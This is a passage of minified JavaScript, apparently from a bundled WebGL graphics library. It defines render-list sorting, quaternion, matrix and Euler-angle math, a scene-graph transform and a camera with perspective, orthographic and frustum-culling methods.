			return e && this.gl[e] ? this.gl[e].bind(this.gl) : (this.extensions[t] || (this.extensions[t] = this.gl.getExtension(t)), e ? this.extensions[t] ? this.extensions[t][i].bind(this.extensions[t]) : null : this.extensions[t])
		}
		sortOpaque(t, e) {
			return t.renderOrder !== e.renderOrder ? t.renderOrder - e.renderOrder : t.program.id !== e.program.id ? t.program.id - e.program.id : t.zDepth !== e.zDepth ? t.zDepth - e.zDepth : e.id - t.id
		}
		sortTransparent(t, e) {
			return t.renderOrder !== e.renderOrder ? t.renderOrder - e.renderOrder : t.zDepth !== e.zDepth ? e.zDepth - t.zDepth : e.id - t.id
		}
		sortUI(t, e) {
			return t.renderOrder !== e.renderOrder ? t.renderOrder - e.renderOrder : t.program.id !== e.program.id ? t.program.id - e.program.id : e.id - t.id
		}
		getRenderList({
			scene: t,
			camera: e,
			frustumCull: i,
			sort: n
		}) {
			let r = [];
			if (e && i && e.updateFrustum(), t.traverse((t => {
					if (!t.visible) return !0;
					t.draw && (i && t.frustumCulled && e && !e.frustumIntersectsMesh(t) || r.push(t))
				})), n) {
				const t = [],
					i = [],
					n = [];
				r.forEach((r => {
					r.program.transparent ? r.program.depthTest ? i.push(r) : n.push(r) : t.push(r), r.zDepth = 0, 0 === r.renderOrder && r.program.depthTest && e && (r.worldMatrix.getTranslation(G), G.applyMatrix4(e.projectionViewMatrix), r.zDepth = G.z)
				})), t.sort(this.sortOpaque), i.sort(this.sortTransparent), n.sort(this.sortUI), r = t.concat(i, n)
			}
			return r
		}
		render({
			scene: t,
			camera: e,
			target: i = null,
			update: n = !0,
			sort: r = !0,
			frustumCull: s = !0,
			clear: o
		}) {
			null === i ? (this.bindFramebuffer(), this.setViewport(this.width * this.dpr, this.height * this.dpr)) : (this.bindFramebuffer(i), this.setViewport(i.width, i.height)), (o || this.autoClear && !1 !== o) && (!this.depth || i && !i.depth || (this.enable(this.gl.DEPTH_TEST), this.setDepthMask(!0)), this.gl.clear((this.color ? this.gl.COLOR_BUFFER_BIT : 0) | (this.depth ? this.gl.DEPTH_BUFFER_BIT : 0) | (this.stencil ? this.gl.STENCIL_BUFFER_BIT : 0))), n && t.updateMatrixWorld(), e && e.updateMatrixWorld(), this.getRenderList({
				scene: t,
				camera: e,
				frustumCull: s,
				sort: r
			}).forEach((t => {
				t.draw({
					camera: e
				})
			}))
		}
	}

	function Y(t, e, i) {
		let n = e[0],
			r = e[1],
			s = e[2],
			o = e[3],
			a = i[0],
			u = i[1],
			h = i[2],
			l = i[3];
		return t[0] = n * l + o * a + r * h - s * u, t[1] = r * l + o * u + s * a - n * h, t[2] = s * l + o * h + n * u - r * a, t[3] = o * l - n * a - r * u - s * h, t
	}
	const X = function(t, e) {
			return t[0] = e[0], t[1] = e[1], t[2] = e[2], t[3] = e[3], t
		},
		$ = function(t, e, i, n, r) {
			return t[0] = e, t[1] = i, t[2] = n, t[3] = r, t
		},
		Z = function(t, e) {
			return t[0] * e[0] + t[1] * e[1] + t[2] * e[2] + t[3] * e[3]
		},
		K = function(t, e) {
			let i = e[0],
				n = e[1],
				r = e[2],
				s = e[3],
				o = i * i + n * n + r * r + s * s;
			return o > 0 && (o = 1 / Math.sqrt(o)), t[0] = i * o, t[1] = n * o, t[2] = r * o, t[3] = s * o, t
		};
	class Q extends Array {
		constructor(t = 0, e = 0, i = 0, n = 1) {
			return super(t, e, i, n), this.onChange = () => {}, this
		}
		get x() {
			return this[0]
		}
		get y() {
			return this[1]
		}
		get z() {
			return this[2]
		}
		get w() {
			return this[3]
		}
		set x(t) {
			this[0] = t, this.onChange()
		}
		set y(t) {
			this[1] = t, this.onChange()
		}
		set z(t) {
			this[2] = t, this.onChange()
		}
		set w(t) {
			this[3] = t, this.onChange()
		}
		identity() {
			var t;
			return (t = this)[0] = 0, t[1] = 0, t[2] = 0, t[3] = 1, this.onChange(), this
		}
		set(t, e, i, n) {
			return t.length ? this.copy(t) : ($(this, t, e, i, n), this.onChange(), this)
		}
		rotateX(t) {
			return function(t, e, i) {
				i *= .5;
				let n = e[0],
					r = e[1],
					s = e[2],
					o = e[3],
					a = Math.sin(i),
					u = Math.cos(i);
				t[0] = n * u + o * a, t[1] = r * u + s * a, t[2] = s * u - r * a, t[3] = o * u - n * a
			}(this, this, t), this.onChange(), this
		}
		rotateY(t) {
			return function(t, e, i) {
				i *= .5;
				let n = e[0],
					r = e[1],
					s = e[2],
					o = e[3],
					a = Math.sin(i),
					u = Math.cos(i);
				t[0] = n * u - s * a, t[1] = r * u + o * a, t[2] = s * u + n * a, t[3] = o * u - r * a
			}(this, this, t), this.onChange(), this
		}
		rotateZ(t) {
			return function(t, e, i) {
				i *= .5;
				let n = e[0],
					r = e[1],
					s = e[2],
					o = e[3],
					a = Math.sin(i),
					u = Math.cos(i);
				t[0] = n * u + r * a, t[1] = r * u - n * a, t[2] = s * u + o * a, t[3] = o * u - s * a
			}(this, this, t), this.onChange(), this
		}
		inverse(t = this) {
			return function(t, e) {
				let i = e[0],
					n = e[1],
					r = e[2],
					s = e[3],
					o = i * i + n * n + r * r + s * s,
					a = o ? 1 / o : 0;
				t[0] = -i * a, t[1] = -n * a, t[2] = -r * a, t[3] = s * a
			}(this, t), this.onChange(), this
		}
		conjugate(t = this) {
			var e, i;
			return i = t, (e = this)[0] = -i[0], e[1] = -i[1], e[2] = -i[2], e[3] = i[3], this.onChange(), this
		}
		copy(t) {
			return X(this, t), this.onChange(), this
		}
		normalize(t = this) {
			return K(this, t), this.onChange(), this
		}
		multiply(t, e) {
			return e ? Y(this, t, e) : Y(this, this, t), this.onChange(), this
		}
		dot(t) {
			return Z(this, t)
		}
		fromMatrix3(t) {
			return function(t, e) {
				let i, n = e[0] + e[4] + e[8];
				if (n > 0) i = Math.sqrt(n + 1), t[3] = .5 * i, i = .5 / i, t[0] = (e[5] - e[7]) * i, t[1] = (e[6] - e[2]) * i, t[2] = (e[1] - e[3]) * i;
				else {
					let n = 0;
					e[4] > e[0] && (n = 1), e[8] > e[3 * n + n] && (n = 2);
					let r = (n + 1) % 3,
						s = (n + 2) % 3;
					i = Math.sqrt(e[3 * n + n] - e[3 * r + r] - e[3 * s + s] + 1), t[n] = .5 * i, i = .5 / i, t[3] = (e[3 * r + s] - e[3 * s + r]) * i, t[r] = (e[3 * r + n] + e[3 * n + r]) * i, t[s] = (e[3 * s + n] + e[3 * n + s]) * i
				}
			}(this, t), this.onChange(), this
		}
		fromEuler(t) {
			return function(t, e, i = "YXZ") {
				let n = Math.sin(.5 * e[0]),
					r = Math.cos(.5 * e[0]),
					s = Math.sin(.5 * e[1]),
					o = Math.cos(.5 * e[1]),
					a = Math.sin(.5 * e[2]),
					u = Math.cos(.5 * e[2]);
				"XYZ" === i ? (t[0] = n * o * u + r * s * a, t[1] = r * s * u - n * o * a, t[2] = r * o * a + n * s * u, t[3] = r * o * u - n * s * a) : "YXZ" === i ? (t[0] = n * o * u + r * s * a, t[1] = r * s * u - n * o * a, t[2] = r * o * a - n * s * u, t[3] = r * o * u + n * s * a) : "ZXY" === i ? (t[0] = n * o * u - r * s * a, t[1] = r * s * u + n * o * a, t[2] = r * o * a + n * s * u, t[3] = r * o * u - n * s * a) : "ZYX" === i ? (t[0] = n * o * u - r * s * a, t[1] = r * s * u + n * o * a, t[2] = r * o * a - n * s * u, t[3] = r * o * u + n * s * a) : "YZX" === i ? (t[0] = n * o * u + r * s * a, t[1] = r * s * u + n * o * a, t[2] = r * o * a - n * s * u, t[3] = r * o * u - n * s * a) : "XZY" === i && (t[0] = n * o * u - r * s * a, t[1] = r * s * u - n * o * a, t[2] = r * o * a + n * s * u, t[3] = r * o * u + n * s * a)
			}(this, t, t.order), this
		}
		fromAxisAngle(t, e) {
			return function(t, e, i) {
				i *= .5;
				let n = Math.sin(i);
				t[0] = n * e[0], t[1] = n * e[1], t[2] = n * e[2], t[3] = Math.cos(i)
			}(this, t, e), this
		}
		slerp(t, e) {
			return function(t, e, i, n) {
				let r, s, o, a, u, h = e[0],
					l = e[1],
					c = e[2],
					d = e[3],
					p = i[0],
					f = i[1],
					m = i[2],
					g = i[3];
				s = h * p + l * f + c * m + d * g, s < 0 && (s = -s, p = -p, f = -f, m = -m, g = -g), 1 - s > 1e-6 ? (r = Math.acos(s), o = Math.sin(r), a = Math.sin((1 - n) * r) / o, u = Math.sin(n * r) / o) : (a = 1 - n, u = n), t[0] = a * h + u * p, t[1] = a * l + u * f, t[2] = a * c + u * m, t[3] = a * d + u * g
			}(this, this, t, e), this
		}
		fromArray(t, e = 0) {
			return this[0] = t[e], this[1] = t[e + 1], this[2] = t[e + 2], this[3] = t[e + 3], this
		}
		toArray(t = [], e = 0) {
			return t[e] = this[0], t[e + 1] = this[1], t[e + 2] = this[2], t[e + 3] = this[3], t
		}
	}

	function J(t, e, i) {
		let n = e[0],
			r = e[1],
			s = e[2],
			o = e[3],
			a = e[4],
			u = e[5],
			h = e[6],
			l = e[7],
			c = e[8],
			d = e[9],
			p = e[10],
			f = e[11],
			m = e[12],
			g = e[13],
			v = e[14],
			_ = e[15],
			D = i[0],
			y = i[1],
			x = i[2],
			w = i[3];
		return t[0] = D * n + y * a + x * c + w * m, t[1] = D * r + y * u + x * d + w * g, t[2] = D * s + y * h + x * p + w * v, t[3] = D * o + y * l + x * f + w * _, D = i[4], y = i[5], x = i[6], w = i[7], t[4] = D * n + y * a + x * c + w * m, t[5] = D * r + y * u + x * d + w * g, t[6] = D * s + y * h + x * p + w * v, t[7] = D * o + y * l + x * f + w * _, D = i[8], y = i[9], x = i[10], w = i[11], t[8] = D * n + y * a + x * c + w * m, t[9] = D * r + y * u + x * d + w * g, t[10] = D * s + y * h + x * p + w * v, t[11] = D * o + y * l + x * f + w * _, D = i[12], y = i[13], x = i[14], w = i[15], t[12] = D * n + y * a + x * c + w * m, t[13] = D * r + y * u + x * d + w * g, t[14] = D * s + y * h + x * p + w * v, t[15] = D * o + y * l + x * f + w * _, t
	}

	function tt(t, e) {
		let i = e[0],
			n = e[1],
			r = e[2],
			s = e[4],
			o = e[5],
			a = e[6],
			u = e[8],
			h = e[9],
			l = e[10];
		return t[0] = Math.hypot(i, n, r), t[1] = Math.hypot(s, o, a), t[2] = Math.hypot(u, h, l), t
	}
	const et = function() {
		const t = [0, 0, 0];
		return function(e, i) {
			let n = t;
			tt(n, i);
			let r = 1 / n[0],
				s = 1 / n[1],
				o = 1 / n[2],
				a = i[0] * r,
				u = i[1] * s,
				h = i[2] * o,
				l = i[4] * r,
				c = i[5] * s,
				d = i[6] * o,
				p = i[8] * r,
				f = i[9] * s,
				m = i[10] * o,
				g = a + c + m,
				v = 0;
			return g > 0 ? (v = 2 * Math.sqrt(g + 1), e[3] = .25 * v, e[0] = (d - f) / v, e[1] = (p - h) / v, e[2] = (u - l) / v) : a > c && a > m ? (v = 2 * Math.sqrt(1 + a - c - m), e[3] = (d - f) / v, e[0] = .25 * v, e[1] = (u + l) / v, e[2] = (p + h) / v) : c > m ? (v = 2 * Math.sqrt(1 + c - a - m), e[3] = (p - h) / v, e[0] = (u + l) / v, e[1] = .25 * v, e[2] = (d + f) / v) : (v = 2 * Math.sqrt(1 + m - a - c), e[3] = (u - l) / v, e[0] = (p + h) / v, e[1] = (d + f) / v, e[2] = .25 * v), e
		}
	}();
	class it extends Array {
		constructor(t = 1, e = 0, i = 0, n = 0, r = 0, s = 1, o = 0, a = 0, u = 0, h = 0, l = 1, c = 0, d = 0, p = 0, f = 0, m = 1) {
			return super(t, e, i, n, r, s, o, a, u, h, l, c, d, p, f, m), this
		}
		get x() {
			return this[12]
		}
		get y() {
			return this[13]
		}
		get z() {
			return this[14]
		}
		get w() {
			return this[15]
		}
		set x(t) {
			this[12] = t
		}
		set y(t) {
			this[13] = t
		}
		set z(t) {
			this[14] = t
		}
		set w(t) {
			this[15] = t
		}
		set(t, e, i, n, r, s, o, a, u, h, l, c, d, p, f, m) {
			return t.length ? this.copy(t) : (function(t, e, i, n, r, s, o, a, u, h, l, c, d, p, f, m, g) {
				t[0] = e, t[1] = i, t[2] = n, t[3] = r, t[4] = s, t[5] = o, t[6] = a, t[7] = u, t[8] = h, t[9] = l, t[10] = c, t[11] = d, t[12] = p, t[13] = f, t[14] = m, t[15] = g
			}(this, t, e, i, n, r, s, o, a, u, h, l, c, d, p, f, m), this)
		}
		translate(t, e = this) {
			return function(t, e, i) {
				let n, r, s, o, a, u, h, l, c, d, p, f, m = i[0],
					g = i[1],
					v = i[2];
				e === t ? (t[12] = e[0] * m + e[4] * g + e[8] * v + e[12], t[13] = e[1] * m + e[5] * g + e[9] * v + e[13], t[14] = e[2] * m + e[6] * g + e[10] * v + e[14], t[15] = e[3] * m + e[7] * g + e[11] * v + e[15]) : (n = e[0], r = e[1], s = e[2], o = e[3], a = e[4], u = e[5], h = e[6], l = e[7], c = e[8], d = e[9], p = e[10], f = e[11], t[0] = n, t[1] = r, t[2] = s, t[3] = o, t[4] = a, t[5] = u, t[6] = h, t[7] = l, t[8] = c, t[9] = d, t[10] = p, t[11] = f, t[12] = n * m + a * g + c * v + e[12], t[13] = r * m + u * g + d * v + e[13], t[14] = s * m + h * g + p * v + e[14], t[15] = o * m + l * g + f * v + e[15])
			}(this, e, t), this
		}
		rotate(t, e, i = this) {
			return function(t, e, i, n) {
				let r, s, o, a, u, h, l, c, d, p, f, m, g, v, _, D, y, x, w, E, b, C, T, F, M = n[0],
					A = n[1],
					S = n[2],
					O = Math.hypot(M, A, S);
				Math.abs(O) < 1e-6 || (O = 1 / O, M *= O, A *= O, S *= O, r = Math.sin(i), s = Math.cos(i), o = 1 - s, a = e[0], u = e[1], h = e[2], l = e[3], c = e[4], d = e[5], p = e[6], f = e[7], m = e[8], g = e[9], v = e[10], _ = e[11], D = M * M * o + s, y = A * M * o + S * r, x = S * M * o - A * r, w = M * A * o - S * r, E = A * A * o + s, b = S * A * o + M * r, C = M * S * o + A * r, T = A * S * o - M * r, F = S * S * o + s, t[0] = a * D + c * y + m * x, t[1] = u * D + d * y + g * x, t[2] = h * D + p * y + v * x, t[3] = l * D + f * y + _ * x, t[4] = a * w + c * E + m * b, t[5] = u * w + d * E + g * b, t[6] = h * w + p * E + v * b, t[7] = l * w + f * E + _ * b, t[8] = a * C + c * T + m * F, t[9] = u * C + d * T + g * F, t[10] = h * C + p * T + v * F, t[11] = l * C + f * T + _ * F, e !== t && (t[12] = e[12], t[13] = e[13], t[14] = e[14], t[15] = e[15]))
			}(this, i, t, e), this
		}
		scale(t, e = this) {
			return function(t, e, i) {
				let n = i[0],
					r = i[1],
					s = i[2];
				t[0] = e[0] * n, t[1] = e[1] * n, t[2] = e[2] * n, t[3] = e[3] * n, t[4] = e[4] * r, t[5] = e[5] * r, t[6] = e[6] * r, t[7] = e[7] * r, t[8] = e[8] * s, t[9] = e[9] * s, t[10] = e[10] * s, t[11] = e[11] * s, t[12] = e[12], t[13] = e[13], t[14] = e[14], t[15] = e[15]
			}(this, e, "number" == typeof t ? [t, t, t] : t), this
		}
		multiply(t, e) {
			return e ? J(this, t, e) : J(this, this, t), this
		}
		identity() {
			var t;
			return (t = this)[0] = 1, t[1] = 0, t[2] = 0, t[3] = 0, t[4] = 0, t[5] = 1, t[6] = 0, t[7] = 0, t[8] = 0, t[9] = 0, t[10] = 1, t[11] = 0, t[12] = 0, t[13] = 0, t[14] = 0, t[15] = 1, this
		}
		copy(t) {
			var e, i;
			return i = t, (e = this)[0] = i[0], e[1] = i[1], e[2] = i[2], e[3] = i[3], e[4] = i[4], e[5] = i[5], e[6] = i[6], e[7] = i[7], e[8] = i[8], e[9] = i[9], e[10] = i[10], e[11] = i[11], e[12] = i[12], e[13] = i[13], e[14] = i[14], e[15] = i[15], this
		}
		fromPerspective({
			fov: t,
			aspect: e,
			near: i,
			far: n
		} = {}) {
			return function(t, e, i, n, r) {
				let s = 1 / Math.tan(e / 2),
					o = 1 / (n - r);
				t[0] = s / i, t[1] = 0, t[2] = 0, t[3] = 0, t[4] = 0, t[5] = s, t[6] = 0, t[7] = 0, t[8] = 0, t[9] = 0, t[10] = (r + n) * o, t[11] = -1, t[12] = 0, t[13] = 0, t[14] = 2 * r * n * o, t[15] = 0
			}(this, t, e, i, n), this
		}
		fromOrthogonal({
			left: t,
			right: e,
			bottom: i,
			top: n,
			near: r,
			far: s
		}) {
			return function(t, e, i, n, r, s, o) {
				let a = 1 / (e - i),
					u = 1 / (n - r),
					h = 1 / (s - o);
				t[0] = -2 * a, t[1] = 0, t[2] = 0, t[3] = 0, t[4] = 0, t[5] = -2 * u, t[6] = 0, t[7] = 0, t[8] = 0, t[9] = 0, t[10] = 2 * h, t[11] = 0, t[12] = (e + i) * a, t[13] = (r + n) * u, t[14] = (o + s) * h, t[15] = 1
			}(this, t, e, i, n, r, s), this
		}
		fromQuaternion(t) {
			return function(t, e) {
				let i = e[0],
					n = e[1],
					r = e[2],
					s = e[3],
					o = i + i,
					a = n + n,
					u = r + r,
					h = i * o,
					l = n * o,
					c = n * a,
					d = r * o,
					p = r * a,
					f = r * u,
					m = s * o,
					g = s * a,
					v = s * u;
				t[0] = 1 - c - f, t[1] = l + v, t[2] = d - g, t[3] = 0, t[4] = l - v, t[5] = 1 - h - f, t[6] = p + m, t[7] = 0, t[8] = d + g, t[9] = p - m, t[10] = 1 - h - c, t[11] = 0, t[12] = 0, t[13] = 0, t[14] = 0, t[15] = 1
			}(this, t), this
		}
		setPosition(t) {
			return this.x = t[0], this.y = t[1], this.z = t[2], this
		}
		inverse(t = this) {
			return function(t, e) {
				let i = e[0],
					n = e[1],
					r = e[2],
					s = e[3],
					o = e[4],
					a = e[5],
					u = e[6],
					h = e[7],
					l = e[8],
					c = e[9],
					d = e[10],
					p = e[11],
					f = e[12],
					m = e[13],
					g = e[14],
					v = e[15],
					_ = i * a - n * o,
					D = i * u - r * o,
					y = i * h - s * o,
					x = n * u - r * a,
					w = n * h - s * a,
					E = r * h - s * u,
					b = l * m - c * f,
					C = l * g - d * f,
					T = l * v - p * f,
					F = c * g - d * m,
					M = c * v - p * m,
					A = d * v - p * g,
					S = _ * A - D * M + y * F + x * T - w * C + E * b;
				S && (S = 1 / S, t[0] = (a * A - u * M + h * F) * S, t[1] = (r * M - n * A - s * F) * S, t[2] = (m * E - g * w + v * x) * S, t[3] = (d * w - c * E - p * x) * S, t[4] = (u * T - o * A - h * C) * S, t[5] = (i * A - r * T + s * C) * S, t[6] = (g * y - f * E - v * D) * S, t[7] = (l * E - d * y + p * D) * S, t[8] = (o * M - a * T + h * b) * S, t[9] = (n * T - i * M - s * b) * S, t[10] = (f * w - m * y + v * _) * S, t[11] = (c * y - l * w - p * _) * S, t[12] = (a * C - o * F - u * b) * S, t[13] = (i * F - n * C + r * b) * S, t[14] = (m * D - f * x - g * _) * S, t[15] = (l * x - c * D + d * _) * S)
			}(this, t), this
		}
		compose(t, e, i) {
			return function(t, e, i, n) {
				let r = e[0],
					s = e[1],
					o = e[2],
					a = e[3],
					u = r + r,
					h = s + s,
					l = o + o,
					c = r * u,
					d = r * h,
					p = r * l,
					f = s * h,
					m = s * l,
					g = o * l,
					v = a * u,
					_ = a * h,
					D = a * l,
					y = n[0],
					x = n[1],
					w = n[2];
				t[0] = (1 - (f + g)) * y, t[1] = (d + D) * y, t[2] = (p - _) * y, t[3] = 0, t[4] = (d - D) * x, t[5] = (1 - (c + g)) * x, t[6] = (m + v) * x, t[7] = 0, t[8] = (p + _) * w, t[9] = (m - v) * w, t[10] = (1 - (c + f)) * w, t[11] = 0, t[12] = i[0], t[13] = i[1], t[14] = i[2], t[15] = 1
			}(this, t, e, i), this
		}
		getRotation(t) {
			return et(t, this), this
		}
		getTranslation(t) {
			var e, i;
			return i = this, (e = t)[0] = i[12], e[1] = i[13], e[2] = i[14], this
		}
		getScaling(t) {
			return tt(t, this), this
		}
		getMaxScaleOnAxis() {
			return function(t) {
				let e = t[0],
					i = t[1],
					n = t[2],
					r = t[4],
					s = t[5],
					o = t[6],
					a = t[8],
					u = t[9],
					h = t[10];
				const l = e * e + i * i + n * n,
					c = r * r + s * s + o * o,
					d = a * a + u * u + h * h;
				return Math.sqrt(Math.max(l, c, d))
			}(this)
		}
		lookAt(t, e, i) {
			return function(t, e, i, n) {
				let r = e[0],
					s = e[1],
					o = e[2],
					a = n[0],
					u = n[1],
					h = n[2],
					l = r - i[0],
					c = s - i[1],
					d = o - i[2],
					p = l * l + c * c + d * d;
				0 === p ? d = 1 : (p = 1 / Math.sqrt(p), l *= p, c *= p, d *= p);
				let f = u * d - h * c,
					m = h * l - a * d,
					g = a * c - u * l;
				p = f * f + m * m + g * g, 0 === p && (h ? a += 1e-6 : u ? h += 1e-6 : u += 1e-6, f = u * d - h * c, m = h * l - a * d, g = a * c - u * l, p = f * f + m * m + g * g), p = 1 / Math.sqrt(p), f *= p, m *= p, g *= p, t[0] = f, t[1] = m, t[2] = g, t[3] = 0, t[4] = c * g - d * m, t[5] = d * f - l * g, t[6] = l * m - c * f, t[7] = 0, t[8] = l, t[9] = c, t[10] = d, t[11] = 0, t[12] = r, t[13] = s, t[14] = o, t[15] = 1
			}(this, t, e, i), this
		}
		determinant() {
			return function(t) {
				let e = t[0],
					i = t[1],
					n = t[2],
					r = t[3],
					s = t[4],
					o = t[5],
					a = t[6],
					u = t[7],
					h = t[8],
					l = t[9],
					c = t[10],
					d = t[11],
					p = t[12],
					f = t[13],
					m = t[14],
					g = t[15];
				return (e * o - i * s) * (c * g - d * m) - (e * a - n * s) * (l * g - d * f) + (e * u - r * s) * (l * m - c * f) + (i * a - n * o) * (h * g - d * p) - (i * u - r * o) * (h * m - c * p) + (n * u - r * a) * (h * f - l * p)
			}(this)
		}
		fromArray(t, e = 0) {
			return this[0] = t[e], this[1] = t[e + 1], this[2] = t[e + 2], this[3] = t[e + 3], this[4] = t[e + 4], this[5] = t[e + 5], this[6] = t[e + 6], this[7] = t[e + 7], this[8] = t[e + 8], this[9] = t[e + 9], this[10] = t[e + 10], this[11] = t[e + 11], this[12] = t[e + 12], this[13] = t[e + 13], this[14] = t[e + 14], this[15] = t[e + 15], this
		}
		toArray(t = [], e = 0) {
			return t[e] = this[0], t[e + 1] = this[1], t[e + 2] = this[2], t[e + 3] = this[3], t[e + 4] = this[4], t[e + 5] = this[5], t[e + 6] = this[6], t[e + 7] = this[7], t[e + 8] = this[8], t[e + 9] = this[9], t[e + 10] = this[10], t[e + 11] = this[11], t[e + 12] = this[12], t[e + 13] = this[13], t[e + 14] = this[14], t[e + 15] = this[15], t
		}
	}
	const nt = new it;
	class rt extends Array {
		constructor(t = 0, e = t, i = t, n = "YXZ") {
			return super(t, e, i), this.order = n, this.onChange = () => {}, this
		}
		get x() {
			return this[0]
		}
		get y() {
			return this[1]
		}
		get z() {
			return this[2]
		}
		set x(t) {
			this[0] = t, this.onChange()
		}
		set y(t) {
			this[1] = t, this.onChange()
		}
		set z(t) {
			this[2] = t, this.onChange()
		}
		set(t, e = t, i = t) {
			return t.length ? this.copy(t) : (this[0] = t, this[1] = e, this[2] = i, this.onChange(), this)
		}
		copy(t) {
			return this[0] = t[0], this[1] = t[1], this[2] = t[2], this.onChange(), this
		}
		reorder(t) {
			return this.order = t, this.onChange(), this
		}
		fromRotationMatrix(t, e = this.order) {
			return function(t, e, i = "YXZ") {
				"XYZ" === i ? (t[1] = Math.asin(Math.min(Math.max(e[8], -1), 1)), Math.abs(e[8]) < .99999 ? (t[0] = Math.atan2(-e[9], e[10]), t[2] = Math.atan2(-e[4], e[0])) : (t[0] = Math.atan2(e[6], e[5]), t[2] = 0)) : "YXZ" === i ? (t[0] = Math.asin(-Math.min(Math.max(e[9], -1), 1)), Math.abs(e[9]) < .99999 ? (t[1] = Math.atan2(e[8], e[10]), t[2] = Math.atan2(e[1], e[5])) : (t[1] = Math.atan2(-e[2], e[0]), t[2] = 0)) : "ZXY" === i ? (t[0] = Math.asin(Math.min(Math.max(e[6], -1), 1)), Math.abs(e[6]) < .99999 ? (t[1] = Math.atan2(-e[2], e[10]), t[2] = Math.atan2(-e[4], e[5])) : (t[1] = 0, t[2] = Math.atan2(e[1], e[0]))) : "ZYX" === i ? (t[1] = Math.asin(-Math.min(Math.max(e[2], -1), 1)), Math.abs(e[2]) < .99999 ? (t[0] = Math.atan2(e[6], e[10]), t[2] = Math.atan2(e[1], e[0])) : (t[0] = 0, t[2] = Math.atan2(-e[4], e[5]))) : "YZX" === i ? (t[2] = Math.asin(Math.min(Math.max(e[1], -1), 1)), Math.abs(e[1]) < .99999 ? (t[0] = Math.atan2(-e[9], e[5]), t[1] = Math.atan2(-e[2], e[0])) : (t[0] = 0, t[1] = Math.atan2(e[8], e[10]))) : "XZY" === i && (t[2] = Math.asin(-Math.min(Math.max(e[4], -1), 1)), Math.abs(e[4]) < .99999 ? (t[0] = Math.atan2(e[6], e[5]), t[1] = Math.atan2(e[8], e[0])) : (t[0] = Math.atan2(-e[9], e[10]), t[1] = 0))
			}(this, t, e), this
		}
		fromQuaternion(t, e = this.order) {
			return nt.fromQuaternion(t), this.fromRotationMatrix(nt, e)
		}
		toArray(t = [], e = 0) {
			return t[e] = this[0], t[e + 1] = this[1], t[e + 2] = this[2], t
		}
	}
	class st {
		constructor() {
			this.parent = null, this.children = [], this.visible = !0, this.matrix = new it, this.worldMatrix = new it, this.matrixAutoUpdate = !0, this.position = new O, this.quaternion = new Q, this.scale = new O(1), this.rotation = new rt, this.up = new O(0, 1, 0), this.rotation.onChange = () => this.quaternion.fromEuler(this.rotation), this.quaternion.onChange = () => this.rotation.fromQuaternion(this.quaternion)
		}
		setParent(t, e = !0) {
			this.parent && t !== this.parent && this.parent.removeChild(this, !1), this.parent = t, e && t && t.addChild(this, !1)
		}
		addChild(t, e = !0) {
			~this.children.indexOf(t) || this.children.push(t), e && t.setParent(this, !1)
		}
		removeChild(t, e = !0) {
			~this.children.indexOf(t) && this.children.splice(this.children.indexOf(t), 1), e && t.setParent(null, !1)
		}
		updateMatrixWorld(t) {
			this.matrixAutoUpdate && this.updateMatrix(), (this.worldMatrixNeedsUpdate || t) && (null === this.parent ? this.worldMatrix.copy(this.matrix) : this.worldMatrix.multiply(this.parent.worldMatrix, this.matrix), this.worldMatrixNeedsUpdate = !1, t = !0);
			for (let e = 0, i = this.children.length; e < i; e++) this.children[e].updateMatrixWorld(t)
		}
		updateMatrix() {
			this.matrix.compose(this.quaternion, this.position, this.scale), this.worldMatrixNeedsUpdate = !0
		}
		traverse(t) {
			if (!t(this))
				for (let e = 0, i = this.children.length; e < i; e++) this.children[e].traverse(t)
		}
		decompose() {
			this.matrix.getTranslation(this.position), this.matrix.getRotation(this.quaternion), this.matrix.getScaling(this.scale), this.rotation.fromQuaternion(this.quaternion)
		}
		lookAt(t, e = !1) {
			e ? this.matrix.lookAt(this.position, t, this.up) : this.matrix.lookAt(t, this.position, this.up), this.matrix.getRotation(this.quaternion), this.rotation.fromQuaternion(this.quaternion)
		}
	}
	const ot = new it,
		at = new O,
		ut = new O;
	class ht extends st {
		constructor(t, {
			near: e = .1,
			far: i = 100,
			fov: n = 45,
			aspect: r = 1,
			left: s,
			right: o,
			bottom: a,
			top: u,
			zoom: h = 1
		} = {}) {
			super(), Object.assign(this, {
				near: e,
				far: i,
				fov: n,
				aspect: r,
				left: s,
				right: o,
				bottom: a,
				top: u,
				zoom: h
			}), this.projectionMatrix = new it, this.viewMatrix = new it, this.projectionViewMatrix = new it, this.worldPosition = new O, this.type = s || o ? "orthographic" : "perspective", "orthographic" === this.type ? this.orthographic() : this.perspective()
		}
		perspective({
			near: t = this.near,
			far: e = this.far,
			fov: i = this.fov,
			aspect: n = this.aspect
		} = {}) {
			return Object.assign(this, {
				near: t,
				far: e,
				fov: i,
				aspect: n
			}), this.projectionMatrix.fromPerspective({
				fov: i * (Math.PI / 180),
				aspect: n,
				near: t,
				far: e
			}), this.type = "perspective", this
		}
		orthographic({
			near: t = this.near,
			far: e = this.far,
			left: i = this.left,
			right: n = this.right,
			bottom: r = this.bottom,
			top: s = this.top,
			zoom: o = this.zoom
		} = {}) {
			return Object.assign(this, {
				near: t,
				far: e,
				left: i,
				right: n,
				bottom: r,
				top: s,
				zoom: o
			}), i /= o, n /= o, r /= o, s /= o, this.projectionMatrix.fromOrthogonal({
				left: i,
				right: n,
				bottom: r,
				top: s,
				near: t,
				far: e
			}), this.type = "orthographic", this
		}
		updateMatrixWorld() {
			return super.updateMatrixWorld(), this.viewMatrix.inverse(this.worldMatrix), this.worldMatrix.getTranslation(this.worldPosition), this.projectionViewMatrix.multiply(this.projectionMatrix, this.viewMatrix), this
		}
		lookAt(t) {
			return super.lookAt(t, !0), this
		}
		project(t) {
			return t.applyMatrix4(this.viewMatrix), t.applyMatrix4(this.projectionMatrix), this
		}
		unproject(t) {
			return t.applyMatrix4(ot.inverse(this.projectionMatrix)), t.applyMatrix4(this.worldMatrix), this
		}
		updateFrustum() {
			this.frustum || (this.frustum = [new O, new O, new O, new O, new O, new O]);
			const t = this.projectionViewMatrix;
			this.frustum[0].set(t[3] - t[0], t[7] - t[4], t[11] - t[8]).constant = t[15] - t[12], this.frustum[1].set(t[3] + t[0], t[7] + t[4], t[11] + t[8]).constant = t[15] + t[12], this.frustum[2].set(t[3] + t[1], t[7] + t[5], t[11] + t[9]).constant = t[15] + t[13], this.frustum[3].set(t[3] - t[1], t[7] - t[5], t[11] - t[9]).constant = t[15] - t[13], this.frustum[4].set(t[3] - t[2], t[7] - t[6], t[11] - t[10]).constant = t[15] - t[14], this.frustum[5].set(t[3] + t[2], t[7] + t[6], t[11] + t[10]).constant = t[15] + t[14];
			for (let t = 0; t < 6; t++) {
				const e = 1 / this.frustum[t].distance();
